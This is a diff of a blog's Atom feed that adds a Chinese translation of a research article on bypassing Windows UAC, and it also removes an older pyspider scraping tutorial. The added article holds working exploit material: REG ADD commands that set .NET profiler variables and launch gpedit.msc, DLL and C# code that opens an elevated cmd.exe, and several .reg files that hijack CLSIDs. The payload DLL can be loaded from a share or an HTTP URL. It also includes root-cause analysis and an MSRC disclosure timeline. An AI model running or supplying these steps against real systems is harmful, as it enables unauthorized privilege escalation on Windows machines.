@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://anhkgg.github.io/"/>
-  <updated>2017-09-14T02:26:09.266Z</updated>
+  <updated>2017-09-21T06:08:51.860Z</updated>
   <id>https://anhkgg.github.io/</id>
   
   <author>
@@ -14,6 +14,95 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>翻译：通过.NET程序提权绕过UAC</title>
+    <link href="https://anhkgg.github.io/tans-net-bypass-uac/"/>
+    <id>https://anhkgg.github.io/tans-net-bypass-uac/</id>
+    <published>2017-09-21T06:04:46.000Z</published>
+    <updated>2017-09-21T06:08:51.860Z</updated>
+    
+    <content type="html"><![CDATA[<p>.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。</p>
+<a id="more"></a>
+<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>去年五月， Casey Smith在他的博客和Twitter上指出.NET分析器的DLL加载可能会被滥用，通过环境变量使合法的.NET程序加载一个恶意DLL</p>
+<p>当看到这一点，脑海中第一种想法就是，如果这个方法在高权限.NET进程也可以工作，那这将是一个绕过UAC的好办法。果然，确实如此。</p>
+<p>这个问题到写这篇博客时依然没有修复，而且可能一直如此——但是在7月，它被 Stefan Kanthak独立地发现并报告了，按完整披露流程公布了该问题。</p>
+<h1 id="绕过UAC"><a href="#绕过UAC" class="headerlink" title="绕过UAC"></a>绕过UAC</h1><p>要让一个.NET应用程序加载任意一个DLL，我们可以使用以下环境变量。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">COR_ENABLE_PROFILING=1</div><div class="line">COR_PROFILER=&#123;GUID&#125;</div><div class="line">COR_PROFILER_PATH=C:\path\to\some.dll</div></pre></td></tr></table></figure>
+<p>在.NET 4以下版本，CLSID必须在HKCR\CLSID{GUID}\InprocServer32定义包含profiling DLL的路径的注册表键。在最近版本中，CLR通过COR_PROFILER_PATH环境变量来找这个DLL，如果COR_PROFILER_PATH没有定义再使用CLSID查找。</p>
+<p>HKCR\CLSID是HKLM和HKCU下Software\Classes\CLSID组合起来显示的。在HKLM（或者系统环境变量）下创建CLSID键需要提权，而在HKCU下创建不需要。需要注意，在用户环境变量和HKCU注册表项下一切也都工作正常。</p>
+<p>可以简单使用一段批处理命令让它工作：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; /ve /t REG_EXPAND_SZ /d &quot;C:\Temp\test.dll&quot; /f</div><div class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER&quot; /t REG_SZ /d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; /f</div><div class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_ENABLE_PROFILING&quot; /t REG_SZ /d &quot;1&quot; /f</div><div class="line">REG ADD &quot;HKCU\Environment&quot; /v &quot;COR_PROFILER_PATH&quot; /t REG_SZ /d &quot;C:\Temp\test.dll&quot; /f</div><div class="line">mmc gpedit.msc</div></pre></td></tr></table></figure>
+<p>这些命令在低权限命令行下可以在高权限的mmc.exe进程中加载C:\temp\test.dll(如果存在)。可以绕过Windows 7到10（包括最新RS3）系统的默认UAC设置。</p>
+<p><img src="/img/net-bypass-uac-1.png" alt="net-bypass-uac-1.png"></p>
+<p><a href="https://gist.github.com/clavoillotte/f2fba9fa4ba8db14093a62164963d4a9" target="_blank" rel="external">内嵌DLL的powershell POC可以在这里找到（只支持X64）。</a></p>
+<p>这个DLL只在DLL_PROCESS_ATTACH下运行一个cmd.exe，会产生一个提权的命令行终端，然后马上退出当前进程，阻止MMC控制台弹出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</div><div class="line">&#123;</div><div class="line">    char cmd[] = &quot;cmd.exe&quot;;</div><div class="line"></div><div class="line">    switch (fdwReason)</div><div class="line">    &#123;</div><div class="line">    case DLL_PROCESS_ATTACH:</div><div class="line">        WinExec(cmd, SW_SHOWNORMAL);</div><div class="line">        ExitProcess(0);</div><div class="line">        break;</div><div class="line">    case DLL_THREAD_ATTACH:</div><div class="line">        break;</div><div class="line">    case DLL_THREAD_DETACH:</div><div class="line">        break;</div><div class="line">    case DLL_PROCESS_DETACH:</div><div class="line">        break;</div><div class="line">    &#125;</div><div class="line">    return TRUE;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>在Windows 7,8.1，10 1703和10 RS3 build 16275中测试通过。<br>当然，如果你有可访问的SMB共享，UNC路径也可以工作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">COR_PROFILER_PATH=\\server\share\test.dll</div></pre></td></tr></table></figure>
+<h1 id="根本原因"><a href="#根本原因" class="headerlink" title="根本原因"></a>根本原因</h1><p>COM运行时在运行高权限进程时会阻止在HKCU查找CLSID，所以这种绕过方式无效，但是.NET运行时没有阻止，在这种情况下，.NET在shim组件查找时会查找这些键值。</p>
+<p><img src="/img/net-bypass-uac-2.png" alt="net-bypass-uac-2.png"></p>
+<p>如果要修复，需要CLR实现和COM一样的检查。</p>
+<h1 id="更多维度"><a href="#更多维度" class="headerlink" title="更多维度"></a>更多维度</h1><p>现在我们知道CLR是如何工作的了，我们可以在堆栈中找他CLR调用的其他在HKCU查找CLSID的实例。一个实例是GPEdit（Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager）组件（在我测试虚拟机中CLSID是{B29D466A-857D-35BA-8712-A758861BFEA1}）。</p>
+<p><img src="/img/net-bypass-uac-3.png" alt="net-bypass-uac-3.png"></p>
+<p>查看HKCU已经存在的项中，好像是指向CLR程序及自己实现的组件。</p>
+<p><img src="/img/net-bypass-uac-4.png" alt="net-bypass-uac-4.png"></p>
+<p>我们可以在HKCU下像这样定义一个COM项（.reg格式）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;]</div><div class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45E7-B440-6E39B2CDBF29&#125;]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\InprocServer32\10.0.0.0]</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v4.0.30319&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;B29D466A-857D-35BA-8712-A758861BFEA1&#125;\ProgId]</div><div class="line">@=&quot;Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager&quot;</div></pre></td></tr></table></figure></p>
+<p>MMC会加载我们的托管DLL，并且尝试访问TestDotNet.Class1类。C#没有一种简单的创建入口是DllMain的简单DLL（我们很懒所以不想写模块初始化），但是貌似注册表指向的类被加载了，所以我们只需要一个静态构造函数来执行我们的提权代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">using System;</div><div class="line">using System.Diagnostics;</div><div class="line"></div><div class="line">namespace TestDotNet</div><div class="line">&#123;</div><div class="line">   public class Class1</div><div class="line">   &#123;</div><div class="line">      static Class1()</div><div class="line">      &#123; </div><div class="line">         Process.Start(&quot;cmd.exe&quot;);</div><div class="line">         Environment.Exit(0);</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>将DLL放在注册表项定义的位置，然后运行gpedit.msc，可以看到弹出了一个提权的终端（和.NET一样）。</p>
+<p><img src="/img/net-bypass-uac-5.png" alt="net-bypass-uac-5.png"></p>
+<p><img src="/img/net-bypass-uac-6.png" alt="net-bypass-uac-6.png"></p>
+<p>这种方式一个有趣的点是CodeBase不仅限于本地文件和SMB共享，这个DLL还可以从HTTP链接中加载。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;CodeBase&quot;=&quot;http://server:8080/test_managed.dll&quot;</div></pre></td></tr></table></figure></p>
+<p>需要注意的是下载的DLL会拷贝到硬盘上，所以这种方式比本地DLL更好检测（硬盘+网络组合）。</p>
+<p>另外一件好事（对攻击者）是这种方式下可以滥用多种CLSID。<br>下面是在compmgmt.msc，event、vwr.msc,secpol.msc和taskschd.msc可使用CLSID：</p>
+<ol>
+<li>托管DLL的Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactor组件</li>
+</ol>
+<p><img src="/img/net-bypass-uac-7.png" alt="net-bypass-uac-7.png"><br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;]</div><div class="line">@=&quot;Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\Implemented Categories\&#123;62C8FE65-4EBB-45e7-B440-6E39B2CDBF29&#125;]</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;D5AB5662-131D-453D-88C8-9BBA87502ADE&#125;\InprocServer32\3.0.0.0]</div><div class="line">&quot;Assembly&quot;=&quot;TestDotNet, Version=0.0.0.0, Culture=neutral&quot;</div><div class="line">&quot;Class&quot;=&quot;TestDotNet.Class1&quot;</div><div class="line">&quot;RuntimeVersion&quot;=&quot;v2.0.50727&quot;</div><div class="line">&quot;CodeBase&quot;=&quot;file://C://Temp//test_managed.dll&quot;</div></pre></td></tr></table></figure></p>
+<ol>
+<li>Native DLL的NDP SymBinder组件，劫持\Server项</li>
+</ol>
+<p><img src="/img/net-bypass-uac-8.png" alt="net-bypass-uac-8.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;]</div><div class="line">@=&quot;NDP SymBinder&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\InprocServer32\4.0.30319]</div><div class="line">@=&quot;4.0.30319&quot;</div><div class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\ProgID]</div><div class="line">@=&quot;CorSymBinder_SxS&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;\Server]</div><div class="line">@=&quot;C:\\Temp\\test_unmanaged.dll&quot;</div></pre></td></tr></table></figure>
+<ol>
+<li>Native DLL的Microsoft Common Language Runtime Meta Data组件，劫持\Server项（只有secpol.msc可用）</li>
+</ol>
+<p><img src="/img/net-bypass-uac-9.png" alt="net-bypass-uac-9.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">Windows Registry Editor Version 5.00</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;]</div><div class="line">@=&quot;Microsoft Common Language Runtime Meta Data&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32]</div><div class="line">@=&quot;C:\\Windows\\System32\\mscoree.dll&quot;</div><div class="line">&quot;ThreadingModel&quot;=&quot;Both&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\InprocServer32\4.0.30319]</div><div class="line">@=&quot;4.0.30319&quot;</div><div class="line">&quot;ImplementedInThisVersion&quot;=&quot;&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\ProgID]</div><div class="line">@=&quot;CLRMetaData.CorRuntimeHost.2&quot;</div><div class="line"></div><div class="line">[HKEY_CURRENT_USER\Software\Classes\CLSID\&#123;CB2F6723-AB3A-11D2-9C40-00C04FA30A3E&#125;\Server]</div><div class="line">@=&quot;..\\..\\..\\..\\Temp\\test_unmanaged.dll&quot;</div></pre></td></tr></table></figure>
+<p>（注意：路径必须是相对的，否则mmc.exe会尝试加载C:\Windows\Microsoft.NET\Framework64\v4.0.30319\C:\Temp\test_unmanaged.dll）</p>
+<h1 id="不是安全边界"><a href="#不是安全边界" class="headerlink" title="不是安全边界"></a>不是安全边界</h1><p>微软多次申明UAC不是一个安全边界，安全从业者以更务实的角度来看它：不要信任UAC，不要用admin运行，用非admin用户运行不需要admin的任务，我非常赞同这种说法。</p>
+<p>但是依然很多人用admin运行所有的东西，他们都是渗透测试人员和红色组织（都是坏人）感兴趣的目标。所以我猜测还会有新的关于UAC的有趣技术。</p>
+<p>如果为了渗透测试，我推荐使用<a href="https://tyranidslair.blogspot.fr/2017/05/reading-your-way-around-uac-part-1.html" target="_blank" rel="external">@tiraniddo的例子</a>（<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" target="_blank" rel="external">一个已经实现</a>，<a href="https://twitter.com/enigma0x3/status/907397236627329024" target="_blank" rel="external">另一个也快来了</a>），它不需要加载DLL，并且目前大部分EDR解决方案还不能捕获它。</p>
+<p>另外，如果你也在研究绕过UAC，这个主题外有很多资源，但是下面的必须读一下：</p>
+<ul>
+<li>@enigma0x3’s research (and his upcoming DerbyCon talk)</li>
+<li>@tiraniddo’s bypass techniques on UAC via the SilentCleanup task and process token reading: part 1, part 2 &amp; part 3</li>
+<li>@hFireF0X’s UACME project that implements most known UAC bypasses, and his posts on kernelmode</li>
+<li>@FuzzySec’s UAC workshop, and his Bypass-UAC project that implements several bypasses in PowerShell</li>
+</ul>
+<p>非常感谢Casey Smith(<a href="https://twitter.com/subTee" target="_blank" rel="external">@subtee</a>)指出.NET profiler DLL技巧，并且感谢对微软开发者找到根本原因给予的帮助，谢谢Matt Graeber (<a href="https://twitter.com/mattifestation/" target="_blank" rel="external">@mattifestation</a>) 的意见和review。</p>
+<h1 id="进展时间"><a href="#进展时间" class="headerlink" title="进展时间"></a>进展时间</h1><p>2017-05-19 发现bypass<br>2017-05-20 给MSRC发邮件 (cc’ing an MS dev as suggested by @mattifestation)<br>2017-05-22 MSRC创建主题 #38811<br>2017-05-20/23 和 MS dev讨论<br>2017-06-24  MSRC回复: “We have finished our investigation and determined this does not meet the bar for servicing downlevel. UAC is not a security boundary.”<br>2017-07-05 Stefan Kanthak绕过方案的完整披露<br>2017-09-15 发表本篇文章</p>
+<p>文章来源：<a href="https://offsec.provadys.com/UAC-bypass-dotnet.html" target="_blank" rel="external">https://offsec.provadys.com/UAC-bypass-dotnet.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;.NET框架可以通过用户自定义环境变量和CLSID注册表项来加载profiler DLL或者COM组件DLL，甚至当前进程是提权的。这种行为可以被利用来绕过Windows 7到10（包括最近的RS3）系统的默认UAC设置，如通过自动提权.NET进程（MMC管理单元）来加载任意的DLL。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
+    
+    
+      <category term="bypassUAC" scheme="https://anhkgg.github.io/tags/bypassUAC/"/>
+    
+      <category term="UAC" scheme="https://anhkgg.github.io/tags/UAC/"/>
+    
+      <category term=".NET" scheme="https://anhkgg.github.io/tags/NET/"/>
+    
+      <category term="mmc.exe" scheme="https://anhkgg.github.io/tags/mmc-exe/"/>
+    
+  </entry>
   
   <entry>
     <title>翻译：FireEye揭露CVE-2017-8759：分发FINSPY的0day</title>
@@ -1741,11 +1830,11 @@ call _KeTestAlertThread@4 ; 检查用户模式APC队列是否为空，不空将U
       <category term="security" scheme="https://anhkgg.github.io/categories/security/"/>
     
     
-      <category term="reverse" scheme="https://anhkgg.github.io/tags/reverse/"/>
-    
       <category term="IDAPro" scheme="https://anhkgg.github.io/tags/IDAPro/"/>
     
       <category term="IDC" scheme="https://anhkgg.github.io/tags/IDC/"/>
+    
+      <category term="reverse" scheme="https://anhkgg.github.io/tags/reverse/"/>
     
   </entry>
   
@@ -2098,38 +2187,6 @@ call _KeTestAlertThread@4 ; 检查用户模式APC队列是否为空，不空将U
       <category term="RPC" scheme="https://anhkgg.github.io/tags/RPC/"/>
     
       <category term="远程过程调用" scheme="https://anhkgg.github.io/tags/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>linux pyspider learning</title>
-    <link href="https://anhkgg.github.io/linux-pyspider-learning/"/>
-    <id>https://anhkgg.github.io/linux-pyspider-learning/</id>
-    <published>2015-01-24T10:54:17.000Z</published>
-    <updated>2016-07-07T04:27:03.432Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="1-创建工程"><a href="#1-创建工程" class="headerlink" title="1. 创建工程"></a><strong>1. 创建工程</strong></h1><p>运行pyspider，然后浏览器中输入localhost:5000，即可进入project管理，Create创建新的project</p>
-<a id="more"></a>
-<h1 id="2-编码"><a href="#2-编码" class="headerlink" title="2. 编码"></a><strong>2. 编码</strong></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">from pyspider.libs.base_handler import * </div><div class="line">import re </div><div class="line"></div><div class="line">class Handler(BaseHandler): </div><div class="line">crawl_config = &#123; </div><div class="line">&#125; </div><div class="line">@every(minutes=24 * 60) </div><div class="line">def on_start(self): </div><div class="line">for i in range(1, 287): </div><div class="line">self.crawl(&apos;http://xxx?ajax=1&amp;major=73&amp;showMore=0&amp;refer=cindex&amp;page=&apos;+str(i)+&apos;&amp;_CSRFToken=&apos;, callback=self.index_page) </div><div class="line"></div><div class="line">@config(age=10 * 24 * 60 * 60) </div><div class="line">def index_page(self, response): </div><div class="line">#print response.json[&apos;data&apos;] </div><div class="line">total = response.json[&apos;data&apos;][&apos;total&apos;] </div><div class="line">lists = response.json[&apos;data&apos;][&apos;lists&apos;] </div><div class="line">#print total, len(lists) </div><div class="line">for i in range(0, len(lists)): </div><div class="line">url = lists[i][&apos;url&apos;]; </div><div class="line">#if re.match(&quot;http://xxx?/corp/\d+/project/\d+&quot;, url): </div><div class="line">self.crawl(url, callback=self.detail_page) </div><div class="line"></div><div class="line">def detail_page(self, response): </div><div class="line">#信息过滤提取</div><div class="line">content = response.doc(&apos;div.position-content&apos;).text() </div><div class="line">if content == &quot;&quot; or content == None: </div><div class="line">content = response.doc(&apos;div.project-info &gt; div.pro-detail&apos;).text() </div><div class="line">return &#123; </div><div class="line">&quot;url&quot;: response.url, </div><div class="line">&quot;title&quot;: response.doc(&apos;title&apos;).text(), </div><div class="line">&quot;content&quot;: content </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>self.crawl(url, callback)抓取网页，callback为响应函数<br>def callback(self, response),response表示内容，可以通过response.doc(‘各类选择器’).text()获取到需要的内容<br>更多response的操作可以查看<a href="http://docs.pyspider.org/en/latest/apis/Response/" target="_blank" rel="external">pyspider response</a></p>
-<p><em>注意：</em><br>由于 response.doc是一个<a href="https://pythonhosted.org/pyquery/#quickstart" target="_blank" rel="external">pyquery</a>对象，信息过滤中可以使用css选择器<br>pyspider自带css选择器生成，但是貌似不能使用<br>在浏览器中f12，也可以自动生成选择器<br><img src="/img/css_select.png" alt="img"><br>在生成的选择其中，如&lt;#pagecontent &gt; table:nth-child(3) &gt; tbody &gt; tr:nth-child(2) &gt; td:nth-child(2) &gt; table &gt; tbody &gt; tr &gt; td &gt; div:nth-child(2)&gt;<br>需要去掉其中的tbody标签，否则无法使用，是否还有其他标签，没有过多测试<br>其实css选择器不用从上到下完整的生成，只要能够唯一获取指定的元素即可</p>
-<h1 id="3-调试"><a href="#3-调试" class="headerlink" title="3. 调试"></a><strong>3. 调试</strong></h1><p>第一次run，调用on_start，crawl指定的url，然后调用callback函数，界面显示如图<br><img src="/img/pyspider_d1.png" alt="img"></p>
-<p>切换到follow窗口，可以看到符合callback函数的url列表<br><img src="/img/pyspider_d2.png" alt="img"></p>
-<p>点击列表中右侧播放按钮，crawl该页面，获取符合规则的url，调用下一个callback<br><img src="/img/pyspider_d3.png" alt="img"></p>
-<p>然后继续播放按钮，可能就是需要页面内容过滤了，根据自己的需求进行过滤<br>return返回的内容会写入数据库</p>
-<h1 id="4-调试好之后，run"><a href="#4-调试好之后，run" class="headerlink" title="4.  调试好之后，run"></a><strong>4.  调试好之后，run</strong></h1><p><img src="/img/pyspider_d4.png" alt="img"><br>然后就可以在results页面看到爬取结果了。<br><img src="/img/pyspider_d5.png" alt="img"></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;1-创建工程&quot;&gt;&lt;a href=&quot;#1-创建工程&quot; class=&quot;headerlink&quot; title=&quot;1. 创建工程&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. 创建工程&lt;/strong&gt;&lt;/h1&gt;&lt;p&gt;运行pyspider，然后浏览器中输入localhost:5000，即可进入project管理，Create创建新的project&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="python" scheme="https://anhkgg.github.io/categories/python/"/>
-    
-    
-      <category term="pyspider" scheme="https://anhkgg.github.io/tags/pyspider/"/>
     
   </entry>
   
